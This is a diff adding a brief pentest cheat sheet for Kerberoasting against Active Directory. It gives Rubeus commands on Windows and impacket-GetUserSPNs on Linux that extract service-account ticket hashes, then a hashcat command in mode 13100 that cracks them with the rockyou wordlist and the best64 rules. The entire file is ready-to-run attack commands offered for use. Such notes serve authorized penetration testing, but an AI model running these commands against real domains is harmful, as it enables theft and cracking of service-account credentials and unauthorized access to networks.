@@ -1,0 +1,13 @@
+#Windows
+#Kerberoast with Rubeus
+.\Rubeus.exe kerberoast /outfile:<hashes.kerberoast>
+#hashcat mode
+hashcat --help | grep -i "Kerberos"
+#hashcat crack
+sudo hashcat -m 13100 <hashes.kerberoast> /<rockyou> -r /usr/share/hashcat/rules/best64.rule --force
+
+#Linux
+#kerberoasting with impacket
+sudo impacket-GetUserSPNs -request -dc-ip <host> <domain>/<user>
+#hashcat crack same command as previous
+
